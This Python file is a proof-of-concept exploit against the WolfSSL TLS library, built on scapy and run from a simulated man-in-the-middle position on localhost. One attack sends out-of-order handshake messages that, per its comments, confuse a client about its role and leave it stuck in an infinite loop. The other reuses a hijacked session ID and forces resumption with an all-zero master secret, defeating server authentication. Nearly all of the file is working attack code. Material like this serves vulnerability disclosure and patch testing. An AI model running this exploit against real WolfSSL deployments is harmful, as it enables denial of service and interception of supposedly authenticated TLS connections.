#!/usr/bin/env python3
import socket, time, select, subprocess, atexit, argparse, hmac

from scapy.all import *
load_layer('tls')

# ip:port that we listen on the easily simulate a MitM position
HOST = '127.0.0.1'
PORT_MITM = 8080

# port of the malicious TLS server under control of the adversary
PORT_REAL_SERVER = 44330

# -----------------------------------------------------------------------------

def create_record(data):
	return TLS(type="handshake", version="TLS 1.2", len=len(data))/data


def print_record(prefix, data):
	sid = None
	record = TLS(data)
	for msg in record.msg:
		print(prefix, repr(msg)[:40])
		if TLSServerHello in msg:
			sid = msg.sid
	return sid


def find_tls_msg(data, tlstype):
	record = TLS(data)
	for msg in record.msg:
		if tlstype in msg:
			return msg
	return None


def proxy_ssl(client, host, port, exit_on_ckex=False):
	server_hello = None
	client_hello = None
	client_key_exchange = None

	# Connect to the final server
	target = (host, port)
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.connect(target)

	try:
		# Select on both sockets until the TLS connection is closed by either end.
		# If they keep it alive then this code will be stuck.
		while True:
			# FIXME HACK: Sleep aftwards so we get the full TLS record at once
			readable, _, _ = select.select([client, server], [], [], 1)
			time.sleep(0.2)

			if client in readable:
				data = client.recv(40960)

				print_record("CLIENT => SERVER", data)
				if find_tls_msg(data, TLSClientHello):
					client_hello = data
				elif find_tls_msg(data, TLSClientKeyExchange):
					client_key_exchange = find_tls_msg(data, TLSClientKeyExchange)
					if exit_on_ckex:
						print("[+] Forwarding ClientKeyExchange and returning...")
						server.sendall(data)
						return server_hello, client_hello, client_key_exchange, server

				server.sendall(data)

			if server in readable:
				data = server.recv(40960)

				print_record("SERVER => CLIENT", data)
				if find_tls_msg(data, TLSServerHello):
					server_hello = find_tls_msg(data, TLSServerHello)

				client.sendall(data)

		client.close()
		server.close()
		
	except:
		pass

	return server_hello, client_hello, client_key_exchange


def hmac_sha384(key, data):
	return hmac.new(key, data, hashlib.sha384).digest()


def tls_prf(secret, label, seed, numbytes):
	key_block = b""
	num_calls = (numbytes + 47) // 48
	A_prev = label + seed
	for i in range(num_calls):
		#print(f"A block: {A_prev.hex()}")
		A_curr = hmac_sha384(secret, A_prev) 
		key_block += hmac_sha384(secret, A_curr + label + seed)

		A_prev = A_curr

	return key_block[:numbytes]

# -----------------------------------------------------------------------------

class WolfClientAttack():
	def __init__(self):
		self.server_attacker = None


	def intercept_legitimate_connection(self, s):
		# Client connects to our IP but will verify the server is google.com using a system CA
		conn, addr = s.accept()

		# Step 1. Accept the ClientHello of the client
		data_client_hello = conn.recv(1024)
		print("[ ] Received ClientHello")

		# Step 2. We need to send a ServerHello before the client will (wrongly) accept a ClientHello.
		#         This is because the first message *must* be a ServerHello.
		self.server_random = random.randbytes(32)
		server_hello = create_record(TLSServerHello(version="TLS 1.2",
					gmt_unix_time=struct.unpack(">I", self.server_random[:4])[0],
					random_bytes=self.server_random[4:],
					cipher="TLS_PSK_WITH_CHACHA20_POLY1305_SHA256"))
		print("[ ] Sending ServerHello")
		conn.sendall(raw(server_hello))

		# Step 3. Send a malicious ClientHello to the victim client.
		#	We must send PSK because RSA/Elliptic are reject by the client.
		#	The client will now mark itself as being a server.
		self.client_random = random.randbytes(32)
		client_hello = create_record(TLSClientHello(version="TLS 1.2",
					gmt_unix_time=struct.unpack(">I", self.client_random[:4])[0],
					random_bytes=self.client_random[4:],
					ciphers=[TLS_PSK_WITH_CHACHA20_POLY1305_SHA256()],
					ext=[TLS_Ext_ExtendedMasterSecret()]
					))
		print(f"[ ] Sending ClientHello", repr(client_hello))
		conn.sendall(raw(client_hello))

		# Step 4. Now send a ServerHelloDone. Because the client marked itself as being
		#	a server the handshake will be considered finished by the client.
		server_done = create_record(TLSServerHelloDone())
		print(f"[ ] Sending ServerHelloDone", repr(server_done))
		conn.sendall(raw(server_done))

		# Step 5. The client will now process plaintext ApplicationData message. This
		#	causes to client to become stuck in an infinite loop.
		appdata = TLSApplicationData(data=b"Hello World" * 5)
		datarecord = TLS(type="application_data", len=len(raw(appdata)))/appdata
		print("Sending:", repr(datarecord))
		conn.sendall(raw(datarecord))
	
		time.sleep(5)


	def run(self):
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			# Listen for incoming TLS connections from clients. We're
			# pretenting to be an attacker that has a MitM position.
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			s.bind((HOST, PORT_MITM))
			s.listen()

			self.intercept_legitimate_connection(s)


	def stop(self):
		pass


# -----------------------------------------------------------------------------

def text_to_stream(text):
	"""
	For some reason subprocess.Popen with stdin=subprocess.PIPE wouldn't let me
	actually write to stdin. Using this seems to solve it somehow.
	"""
	p = os.pipe()
	os.write(p[1], text.encode('utf-8'))
	os.close(p[1])
	return os.fdopen(p[0], "r")

class WolfServerAttack():
	def __init__(self):
		self.mitm = None
		self.client = None

	def create_session(self):
		"""Let legitimate client connect and create a session. Return this session ID."""

		cmd = f"openssl s_client -connect localhost:{PORT_MITM} -sess_out session.temp"
		cmd += " -cert MyClient1.pem -key MyClient1.key -CAfile ClientRootCA.pem"
		self.client = subprocess.Popen(cmd.split(), stdin=text_to_stream("Hello World\n"))

		# First connection to adversary. This ClientHello doesn't yet contain the session ID.
		print("[ ] Waiting for 1st connection to server")
		conn, addr = self.mitm.accept()
		self.server_hello, _, _ = proxy_ssl(conn, "localhost", PORT_REAL_SERVER)
		self.session_id = self.server_hello.sid

		print(f"[+] Session ID: {self.session_id.hex()}")

		self.client.wait()
		self.client = None


	def attack_server_auth(self):
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.connect(("localhost", PORT_REAL_SERVER))

		# 1. Connect to the server and resume a valid session. Use the client random from
		#    the client victim connection.
		client_random = random.randbytes(32)
		client_hello = create_record(TLSClientHello(version="TLS 1.2",
					gmt_unix_time=struct.unpack(">I", client_random[:4])[0],
					random_bytes=client_random[4:],
					ciphers=[TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384()],
					sid=self.session_id,
					ext=[TLS_Ext_ExtendedMasterSecret()]))
		print(f"[ ] Sending ClientHello", repr(client_hello))
		conn.sendall(raw(client_hello))

		# 1b. Wait for the responses
		time.sleep(0.1)

		# 2. Send a ServerHello to the server. This overwrite the server.random with the one from the
		#    client victim connection. Also Causes resume to be aborted (but part of encryption stays enabled).
		server_random = random.randbytes(32)
		server_hello = create_record(TLSServerHello(version="TLS 1.2",
					gmt_unix_time=struct.unpack(">I", server_random[:4])[0],
					random_bytes=server_random[4:],
					cipher="TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
					sid=b"\x00" * len(self.session_id), # resumption continues with all-zero master secret
					ext=[TLS_Ext_ExtendedMasterSecret()]))
		print("[ ] Sending ServerHello")
		conn.sendall(raw(server_hello))

		# 3. Now complete the resumption handshake. First send CCS.
		server_ccs = TLS(version="TLS 1.2", len=1, type="change_cipher_spec")/TLSChangeCipherSpec()
		print("Sending:", repr(server_ccs))
		conn.sendall(raw(server_ccs))

		master_secret = b"\x00" * 48
		key_block = tls_prf(master_secret, b"key expansion", server_random + client_random, 168)

		print(f"Master Secret: {master_secret.hex()}");
		print(f"Server Random: {server_random.hex()}");
		print(f"Client Random: {client_random.hex()}");
		print(f"Digest:        {key_block.hex()}");
		print("\nDone. The derived digest shown above should match the digest calculated by the server.")

		time.sleep(2)


	def run(self):
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.mitm:
			# Listen for incoming TLS connections that we will proxy
			# to the server we want (either real or attacker one).
			self.mitm.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.mitm.bind((HOST, PORT_MITM))
			self.mitm.listen()

			# 1. Let a legitimate client create a valid session ID.
			self.create_session()

			# 2. We used the legitimate session ID in our attack.
			self.attack_server_auth()


	def stop(self):
		if self.client:
			self.client.terminate()
			self.client.wait()

# -----------------------------------------------------------------------------


def cleanup():
	attack.stop()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description=f"PoC against WolfSSL.")
	parser.add_argument('--server', default=False, action='store_true', help="Attack the server.")
	options = parser.parse_args()

	if options.server:
		attack = WolfServerAttack()
	else:
		attack = WolfClientAttack()
		print('\n\tAfter starting, connect using: make && '
			+ './examples/client/client -h 127.0.0.1 -p 8080 -A ClientRootCA.pem -s -l PSK-CHACHA20-POLY1305\n')

	atexit.register(cleanup)
	attack.run()

